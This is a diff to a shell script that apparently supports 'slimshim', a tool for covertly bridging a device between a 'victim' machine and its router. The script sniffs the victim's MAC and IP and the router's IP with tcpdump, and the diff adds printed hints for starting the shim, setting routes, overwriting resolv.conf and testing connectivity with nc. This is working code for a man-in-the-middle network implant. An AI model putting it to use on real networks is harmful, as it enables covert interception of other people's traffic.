@@ -25,8 +25,20 @@ ip=$(echo $sniff |sed -e 's/.*length .*: \(.*\) > .*/\1/' |cut -d'.' -f1-4)
 echo "mac is $mac"
 echo "ip is $ip"
 
+echo "# getting routerip.  Unplug and replug ethernet (to victim) to run quicker"
 sniff=$(tcpdump -c1 -nni br-lan ether src $routermac and ether dst $mac and arp 2>/dev/null)
 # 21:33:32.482541 ARP, Reply 192.168.1.1 is-at 68:05:ca:32:5e:85, length 46
-router=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
-echo "router is $router"
+routerip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
+echo "routerip=$routerip"
+
+echo "###########################################"
+echo "# Here is a hint on how to run slimshim.sh:"
+echo "./slimshim.sh $ip $mac"
+subnet=$(echo $ip |cut -d'.' -f1-3)
+echo "route add -net ${subnet}.0/24 dev br-lan"
+echo "route add default gw $routerip"
+echo "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
+echo "###########################################"
+echo "# Here is how you can test connectivity:"
+echo "echo 'asdf'|nc cnn.com 80 |head"
 
